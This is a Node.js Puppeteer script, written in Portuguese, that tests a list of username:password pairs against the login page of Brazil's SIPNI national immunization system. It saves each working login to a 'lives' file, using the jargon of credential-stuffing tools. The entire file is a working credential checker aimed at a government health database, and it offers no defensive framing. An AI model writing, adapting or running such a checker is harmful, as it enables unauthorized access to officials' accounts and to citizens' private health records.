const fs = require("fs");
const puppeteer = require("puppeteer");

async function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}

async function tentarLogin(usuario, senha) {
  const navegador = await puppeteer.launch({ headless: true, defaultViewport: null });
  const page = await navegador.newPage();

  try {
    await page.goto("https://sipni.datasus.gov.br/si-pni-web/faces/inicio.jsf", {
      waitUntil: "networkidle2",
      timeout: 60000
    });

    await page.waitForSelector("input[placeholder='Informe o usuário']", { timeout: 20000 });
    await page.waitForSelector("input[placeholder='Informe a senha']", { timeout: 20000 });

    await page.type("input[placeholder='Informe o usuário']", usuario, { delay: 50 });
    await page.type("input[placeholder='Informe a senha']", senha, { delay: 50 });

    await page.click("button[type='submit']");

    await delay(6000);

    const erro = await page.$eval("#errorMessage_container", el => el.innerText).catch(() => null);

    await navegador.close();

    return !(erro && erro.includes("Usuário ou senha incorreto"));
  } catch {
    await navegador.close();
    return false;
  }
}

(async () => {
  const logins = fs.readFileSync("logs.txt", "utf8").split('\n').filter(l => l.trim());
  
  console.log("\n✅ Testando logins SIPNI...\n");

  const livesFile = "lives.txt";
  
  fs.writeFileSync(livesFile, "");

  for (let login of logins) {
    const [usuario, senha] = login.split(':').map(s => s.trim());
    
    if (!usuario || !senha) continue;
    
    const valido = await tentarLogin(usuario, senha);
    
    if (valido) {
      console.log(`[✅] LIVE: ${usuario}:${senha}`);
      fs.appendFileSync(livesFile, `${usuario}:${senha}\n`);
    } else {
      console.log(`[❌] DIE: ${usuario}`);
    }
  }

  const livesSalvos = fs.readFileSync(livesFile, "utf8").split('\n').filter(l => l.trim());
  
  console.log(`\n🏁 Finalizado! ${livesSalvos.length} logins válidos salvos em ${livesFile}`);
})();